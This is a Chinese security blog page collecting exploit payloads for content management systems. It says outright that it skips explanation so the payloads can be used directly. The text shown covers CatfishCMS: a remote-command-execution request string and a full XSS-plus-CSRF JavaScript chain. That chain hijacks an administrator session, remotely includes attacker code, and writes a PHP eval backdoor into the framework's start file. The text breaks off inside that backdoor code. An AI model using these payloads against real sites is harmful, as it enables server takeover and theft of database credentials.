@@ -1,0 +1,579 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>CMS的Payload收集 | 雲流のLowest World</title>
+        <meta name="author" content="C1oudfL0w0" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入jQuery-->
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<!-- 引入不蒜子-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <!--flag{never_g0nna g1ve_you up}-->
+
+        <!-- 页面点击小红心与文字 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+
+        <!-- 浏览器标题 -->
+         <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+         
+        <!--动态背景-->
+        <script type="text/javascript"
+        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+        <!--文章目录-->
+        
+    <div id="toc" class="toc-article">
+    <h3><i class="fa-brands fa-readme"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CatfishCMS"><span class="toc-text">CatfishCMS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%EF%BC%88CNVD-2019-06255%EF%BC%89CatfishCMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">（CNVD-2019-06255）CatfishCMS远程命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-5-7-csrf-getshell"><span class="toc-text">CatfishCMS 4.5.7 csrf getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-5-7-xss"><span class="toc-text">CatfishCMS 4.5.7 xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-csrf-getshell"><span class="toc-text">CatfishCMS 4.6.15 csrf getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-%E5%89%8D%E5%8F%B0xss"><span class="toc-text">CatfishCMS 4.6.15 前台xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS-4-6-15-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-text">CatfishCMS 4.6.15 后台文件包含getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS%E5%90%8E%E5%8F%B0csrf"><span class="toc-text">CatfishCMS后台csrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CatfishCMS%E5%90%8E%E5%8F%B0%E5%82%A8%E5%AD%98%E5%9E%8Bxss"><span class="toc-text">CatfishCMS后台储存型xss</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CmsEasy"><span class="toc-text">CmsEasy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">CmsEasy 7.3.8 sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-text">CmsEasy 7.3.8 任意文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-3-8-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">CmsEasy 7.3.8 本地文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CmsEasy-7-6-3-2-20200422-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">CmsEasy 7.6.3.2_20200422 逻辑漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dedecms"><span class="toc-text">Dedecms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Discuz"><span class="toc-text">Discuz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Druid"><span class="toc-text">Druid</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Drupal"><span class="toc-text">Drupal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ECShop"><span class="toc-text">ECShop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EmpireCMS"><span class="toc-text">EmpireCMS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Eyoucms"><span class="toc-text">Eyoucms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FastAdmin"><span class="toc-text">FastAdmin</span></a></li></ol>
+    </div>
+  
+        
+        <!--返回顶部-->
+        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+            <a title="返回顶部">↑</a>
+            </div>
+        <script src="/blog/js/totop.js"></script>
+
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>CMS的Payload收集</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/25
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/CMS/" style="color: #ff7d73">CMS</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.8k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/">https://www.hacking8.com/bug-web/</a></p>
+<p>收集常见cms的payload方便在某些时候一把梭，不做具体原理解析与复现</p>
+<span id="more"></span>
+
+<h1 id="CatfishCMS"><a href="#CatfishCMS" class="headerlink" title="CatfishCMS"></a>CatfishCMS</h1><h2 id="（CNVD-2019-06255）CatfishCMS远程命令执行"><a href="#（CNVD-2019-06255）CatfishCMS远程命令执行" class="headerlink" title="（CNVD-2019-06255）CatfishCMS远程命令执行"></a>（CNVD-2019-06255）CatfishCMS远程命令执行</h2><p>相关文件：</p>
+<p>catfish&#x2F;library&#x2F;think&#x2F;Request.php</p>
+<p>application&#x2F;config.php </p>
+<p>application&#x2F;config.php 中定义PATHINFO变量名为’ s ‘。可用s传入需要执行的命令，如s&#x3D;dir</p>
+<p>payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span>dir<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-5-7-csrf-getshell"><a href="#CatfishCMS-4-5-7-csrf-getshell" class="headerlink" title="CatfishCMS 4.5.7 csrf getshell"></a>CatfishCMS 4.5.7 csrf getshell</h2><p>相关文件：</p>
+<p>application&#x2F;admin&#x2F;controller&#x2F;Index.php</p>
+<p>前台评论处插入xss代码-&gt;诱骗后台管理员访问网站-内容管理-评论管理-自动执行xss代码-&gt;通过csrf插入一条新文章-&gt;通过csrf清除缓存-&gt;在通过js访问前端任意页面生成缓存建立shell</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime</span></span>
+<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime/cache</span></span>
+<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//www.xxxxxxx.com/runtime/cache/8d6ab84ca2af9fccd4e4048694176ebf.php</span></span>
+按顺序输入如果前两个访问得到的结果是403  最后的结果不是403或是404 而是返回正常的页面，那么说明站点的缓存目录是可以访问的，这个时候可以使用此漏洞。配合xss+csrf 获取getshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="CatfishCMS-4-5-7-xss"><a href="#CatfishCMS-4-5-7-xss" class="headerlink" title="CatfishCMS 4.5.7 xss"></a>CatfishCMS 4.5.7 xss</h2><p>相关文件：</p>
+<p>application&#x2F;config.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<p>application&#x2F;index&#x2F;controller&#x2F;Common.php</p>
+<hr>
+<h2 id="CatfishCMS-4-6-15-csrf-getshell"><a href="#CatfishCMS-4-6-15-csrf-getshell" class="headerlink" title="CatfishCMS 4.6.15 csrf getshell"></a>CatfishCMS 4.6.15 csrf getshell</h2><p>相关文件：</p>
+<p>CatfishCMS-4.6.12\catfish\library\think\Template.php</p>
+<p>poc：</p>
+<p>前台注册一个账户-&gt;注册一个图片马到网站中-&gt;评论处插入xss代码-&gt;等待无辜管理员登录网站-&gt;获取 verification(绕过检测)-&gt;管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)-&gt;包含漏洞执行代码-&gt;包含漏洞添加getshell_code.php文件写入恶意代码-&gt;包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库-&gt;删除我们前面的评论-&gt;删除我们csrf创建的页面-&gt;邮件通知我们-&gt;getshell</p>
+<p>CatfishCMS-4.6.12-xss.js</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*  
+    需要插入的xss代码
+    &lt;img src="#" alt="xss_csrf_getshll" onerror="var url = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/CatfishCMS-4.6.12-xss.js';xss_js = '&lt;scr'+'ipt src='+url+'>&lt;\/sc'+'ript>';$('body').append(xss_js);">
+*/</span> 
+
+<span class="token comment">//不用动的</span>
+<span class="token keyword">var</span> articles <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/articles.html'</span><span class="token punctuation">;</span><span class="token comment">//用来获取 verification 绕过检测</span>
+<span class="token keyword">var</span> newpage <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/newpage.html'</span><span class="token punctuation">;</span><span class="token comment">//生成文章地址</span>
+<span class="token keyword">var</span> allpage <span class="token operator">=</span> <span class="token string">'index.php/admin/Index/allpage.html'</span><span class="token punctuation">;</span><span class="token comment">//获取文章链接</span>
+
+<span class="token comment">//需要改的</span>
+<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://0-sec.org'</span><span class="token punctuation">;</span><span class="token comment">//你要日的站的域名</span>
+<span class="token keyword">var</span> directory <span class="token operator">=</span> <span class="token string">'/cms/CatfishCMS-4.6.12/'</span><span class="token punctuation">;</span> <span class="token comment">//日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写)</span>
+<span class="token keyword">var</span> img_trojan_url <span class="token operator">=</span> <span class="token string">'../../../'</span><span class="token operator">+</span><span class="token string">'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg'</span><span class="token punctuation">;</span><span class="token comment">//图片马的地址 修改 + 号后面的即可</span>
+<span class="token keyword">var</span> getshell_code <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt'</span><span class="token punctuation">;</span><span class="token comment">//恶意代码远程包含的地址</span>
+
+<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'&lt;div id="csrf_verification" style="display:none;">&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'&lt;div id="csrf_allpage" style="display:none;">&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>articles<span class="token punctuation">,</span>
+    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
+    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">verification_content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_verification'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>verification_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> verification <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#verification'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用来绕过验证的</span>
+        <span class="token comment">// alert(verification);</span>
+
+        <span class="token comment">//csrf生成文章,引起文件包含漏洞</span>
+        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+            <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>newpage<span class="token punctuation">,</span>
+            <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+                <span class="token string-property property">'biaoti'</span><span class="token operator">:</span><span class="token string">'xss_csrf_getshll'</span><span class="token punctuation">,</span>
+                <span class="token string-property property">'template'</span><span class="token operator">:</span>img_trojan_url<span class="token punctuation">,</span>
+                <span class="token string-property property">'verification'</span><span class="token operator">:</span>verification<span class="token punctuation">,</span>
+                <span class="token string-property property">'fabushijian'</span><span class="token operator">:</span><span class="token string">'2017-12-05 11:56:48'</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token comment">//csrf获取shell链接</span>
+                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span>allpage<span class="token punctuation">,</span>
+                    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">allpage_content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>allpage_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">var</span> shell_id <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">var</span> shell_url <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#csrf_allpage .table-responsive .table-bordered tbody tr td a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token keyword">var</span> shell_content <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">"$myfile = fopen('getshell_code.php', 'w');"</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">'$txt = '</span><span class="token operator">+</span><span class="token string">'file_get_contents("'</span><span class="token operator">+</span>getshell_code<span class="token operator">+</span><span class="token string">'");'</span><span class="token punctuation">;</span>
+                            shell_content<span class="token operator">+=</span> <span class="token string">'fwrite($myfile, $txt);'</span><span class="token punctuation">;</span>
+                            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>shell_content<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token comment">//执行shell 生成马子</span>
+                        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+                            <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>shell_url<span class="token punctuation">,</span>
+                            <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>
+                            <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'ddd'</span><span class="token operator">:</span>shell_content<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                            <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span><span class="token string">'getshell_code.php'</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span> 
+                                    <span class="token comment">// data: &#123;'zzz':1&#125;</span>
+                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+                            <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                                $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token operator">+</span>directory<span class="token operator">+</span><span class="token string">'getshell_code.php'</span><span class="token punctuation">,</span>
+                                    <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span> 
+                                    <span class="token comment">// data: &#123;'zzz':1&#125;</span>
+                                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token punctuation">&#125;</span>   
+                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    <span class="token punctuation">&#125;</span> 
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token punctuation">&#125;</span> 
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>getshell_code.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+    <span class="token variable">$start_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'catfish/start.php'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'eval(@$_POST[ddd]);'</span><span class="token punctuation">;</span>
+    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'catfish/start.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$start_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span>zzz<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"application/database.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//分别对应的是 地址，端口号，连接的数据库，编码</span>
